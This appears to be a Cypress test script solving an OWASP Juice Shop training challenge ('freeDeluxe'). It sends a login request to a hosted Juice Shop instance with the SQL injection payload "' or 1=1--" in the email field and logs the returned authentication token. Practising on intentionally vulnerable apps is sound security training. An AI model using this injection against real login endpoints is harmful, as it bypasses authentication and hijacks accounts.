describe('challenge "freeDeluxe"', () => {
    it('test', ()=>{
        // cy.getCookie('token').then((token) => {
            cy.request({
              url: 'https://juice-shop.eliitme.xyz/rest/user/login',
              method: 'POST',
              headers: { accept: 'application/json, text/plain, */*' },
              body:{
                email: "' or 1=1--", password: "a"
              }
            }).then((response) => {
              cy.log(response.body["authentication"]["token"]);
            })
          })
})